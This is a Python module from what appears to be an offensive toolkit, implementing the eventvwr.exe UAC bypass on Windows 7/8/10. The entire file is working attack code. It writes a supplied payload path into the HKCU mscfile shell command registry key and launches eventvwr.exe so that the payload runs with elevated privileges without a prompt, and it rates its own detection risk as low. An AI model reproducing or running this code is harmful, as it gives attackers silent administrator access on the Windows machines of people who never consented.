"""
Event Viewer UAC Bypass Module
Bypasses UAC using eventvwr.exe registry hijacking.

How it works:
1. eventvwr.exe auto-elevates without UAC prompt
2. It checks HKCU registry for mscfile shell command
3. We hijack that registry key to point to our payload
4. When eventvwr runs, our payload executes elevated

Works on: Windows 7/8/10 (older builds)
"""

from pathlib import Path

import sys

sys.path.append(str(Path(__file__).parent.parent))
from ..core.base import UACBypassBase

try:
    import winreg

    WINDOWS_AVAILABLE = True
except ImportError:
    WINDOWS_AVAILABLE = False


class EventvwrBypass(UACBypassBase):
    """UAC bypass using eventvwr.exe."""

    METHOD_NAME = "eventvwr"
    DESCRIPTION = "Event Viewer UAC bypass (Windows 7/8/10)"
    MIN_VERSION = 7
    MAX_BUILD = 14393  # Patched in newer versions
    DETECTION_RISK = "Low"
    SUCCESS_RATE = 0.90

    # Registry path that eventvwr checks
    REG_PATH = r'Software\Classes\mscfile\shell\open\command'

    # Event Viewer executable path
    EVENTVWR_PATH = r'C:\Windows\System32\eventvwr.exe'

    def __init__(self, output_dir: str = "uac_bypasses", verbose: bool = False):
        """
        Initialize the eventvwr bypass.

        Args:
            output_dir: Directory for storing output files
            verbose: Enable verbose logging
        """
        super().__init__(output_dir, verbose)
        self.log("Event Viewer bypass module initialized", "SUCCESS")

    def bypass(self, payload_path: str) -> bool:
        """
        Execute eventvwr UAC bypass.

        Args:
            payload_path: Path to payload executable

        Returns:
            True if successful, False otherwise
        """
        if not WINDOWS_AVAILABLE:
            self.log("Windows registry not available", "ERROR")
            return False

        self.log("Configuring registry for eventvwr bypass...", "INFO")

        try:
            # Create registry key
            key = winreg.CreateKey(winreg.HKEY_CURRENT_USER, self.REG_PATH)

            # Set default value to payload path
            winreg.SetValueEx(key, '', 0, winreg.REG_SZ, payload_path)

            winreg.CloseKey(key)

            # Track for cleanup
            self.modified_registry.append(
                (winreg.HKEY_CURRENT_USER, self.REG_PATH, '')
            )

            self.log("Registry configured successfully", "SUCCESS")

            # Execute eventvwr
            self.log("Triggering eventvwr.exe...", "INFO")

            success = self.execute_process(self.EVENTVWR_PATH, wait=False, timeout=3)

            return success

        except Exception as e:
            self.log(f"Eventvwr bypass failed: {e}", "ERROR")
            return False


if __name__ == "__main__":
    bypass = EventvwrBypass(verbose=True)
    print(f"\nMethod: {bypass.METHOD_NAME}")
    print(f"Description: {bypass.DESCRIPTION}")
    print(f"Success Rate: {bypass.SUCCESS_RATE * 100:.0f}%")